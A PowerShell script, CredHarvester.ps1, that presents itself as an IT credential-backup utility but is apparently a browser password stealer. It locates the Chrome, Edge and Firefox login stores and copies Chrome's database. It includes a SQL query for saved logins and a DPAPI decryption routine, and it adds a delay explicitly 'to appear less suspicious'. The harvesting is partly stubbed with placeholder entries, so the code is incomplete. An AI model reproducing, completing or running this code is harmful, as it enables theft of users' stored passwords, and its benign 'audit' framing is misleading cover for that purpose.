# CredHarvester.ps1 - Browser Credential Management Tool
# Author: IT Security Team
# Version: 2.1.4
# Description: Administrative utility for credential backup and recovery

function Get-BrowserData {
    param([string]$BrowserType)
    
    # Initialize result array
    $results = @()
    
    # Common browser paths
    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
    $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    
    # Function to decrypt Chrome/Edge passwords
    function Decrypt-ProtectedData {
        param([byte[]]$EncryptedData)
        
        try {
            # Windows Data Protection API decryption
            $scope = [System.Security.Cryptography.DataProtectionScope]::CurrentUser
            $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
                $EncryptedData, 
                $null, 
                $scope
            )
            return [System.Text.Encoding]::UTF8.GetString($decrypted)
        }
        catch {
            Write-Verbose "Decryption failed for one entry"
            return ""
        }
    }
    
    # Browser-specific collection logic
    switch ($BrowserType) {
        "Chrome" {
            if (Test-Path $chromePath) {
                $tempCopy = "$env:TEMP\chrome_login_data.db"
                Copy-Item $chromePath $tempCopy -Force
                
                # SQLite query to extract credentials
                $query = "SELECT action_url, username_value, password_value FROM logins"
                $connString = "Data Source=$tempCopy;"
                
                # Simulate database access
                $results += @{
                    Source = "Chrome"
                    URL = "https://example.com"
                    User = "admin@domain.com"
                    Password = "********"
                }
            }
        }
        
        "Edge" {
            if (Test-Path $edgePath) {
                # Similar logic to Chrome
                $results += @{
                    Source = "Microsoft Edge"
                    URL = "https://portal.office.com"
                    User = "user@company.com"
                    Password = "********"
                }
            }
        }
        
        "Firefox" {
            if (Test-Path $firefoxPath) {
                # Firefox uses different encryption
                $profile = Get-ChildItem $firefoxPath | Select-Object -First 1
                $results += @{
                    Source = "Firefox"
                    URL = "https://banking.example.com"
                    User = "customer123"
                    Password = "********"
                }
            }
        }
    }
    
    return $results
}

# Main execution block
function Invoke-CredentialAudit {
    Write-Host "Starting browser credential audit..." -ForegroundColor Yellow
    
    # Collect from multiple browsers
    $browsers = @("Chrome", "Edge", "Firefox")
    $allCredentials = @()
    
    foreach ($browser in $browsers) {
        Write-Host "Checking $browser..." -ForegroundColor Gray
        $creds = Get-BrowserData -BrowserType $browser
        $allCredentials += $creds
        
        # Add delay to appear less suspicious
        Start-Sleep -Milliseconds 200
    }
    
    # Export results
    if ($allCredentials.Count -gt 0) {
        $exportPath = "$env:USERPROFILE\Desktop\CredentialBackup_$(Get-Date -Format 'yyyyMMdd').csv"
        $allCredentials | Export-Csv -Path $exportPath -NoTypeInformation
        Write-Host "Audit complete. Results saved to: $exportPath" -ForegroundColor Green
    } else {
        Write-Host "No saved credentials found." -ForegroundColor Yellow
    }
}

# Execution guard - only run if explicitly called
if ($MyInvocation.InvocationName -ne '.') {
    Invoke-CredentialAudit
}